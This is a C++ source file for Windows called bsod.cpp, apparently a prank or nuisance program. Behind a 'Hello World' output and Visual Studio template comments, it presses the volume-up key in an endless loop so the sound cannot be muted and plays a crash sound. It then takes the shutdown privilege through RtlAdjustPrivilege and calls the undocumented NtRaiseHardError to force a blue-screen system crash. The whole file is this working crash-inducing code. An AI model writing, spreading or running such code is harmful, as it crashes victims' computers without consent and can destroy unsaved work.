// bsod.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <mmsystem.h>
#include <thread>
#pragma comment(lib, "Winmm.lib")
using namespace std;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void simulateKeystroke(WORD key)
{ // Create a generic keyboard event
    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wScan = 0;
    // hardware scan code for key
    input.ki.time = 0;
    input.ki.dwExtraInfo = 0;            // Press the key
    input.ki.wVk = key;                  // virtual-key code
    input.ki.dwFlags = 0;                // 0 for key press
    SendInput(1, &input, sizeof(INPUT)); // Release the key
    input.ki.dwFlags = KEYEVENTF_KEYUP;  // KEYEVENTF_KEYUP for key release
    SendInput(1, &input, sizeof(INPUT));
}

void threadOfDoom() {
    //HAHAHAHAHAHAHA NO MORE MUTIIIIIIIIIIIIING
    while (true) {
        simulateKeystroke(0xAF);
	}
}

int main()
{
    std::cout << "Hello World!\n";
    for (int i = 0; i < 100; i++) {
        simulateKeystroke(0xAF);
    }
	thread ThreadOfDoom(threadOfDoom);
    mciSendString(L"close mp3", NULL, 0, NULL);
    std::wstring command = L"open \"" + std::wstring(L"crash.mp3") + L"\" type mpegvideo alias mp3";
    mciSendString(command.c_str(), NULL, 0, NULL);
    mciSendString(L"play mp3 from 0", NULL, 0, NULL);
    Sleep(9000);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file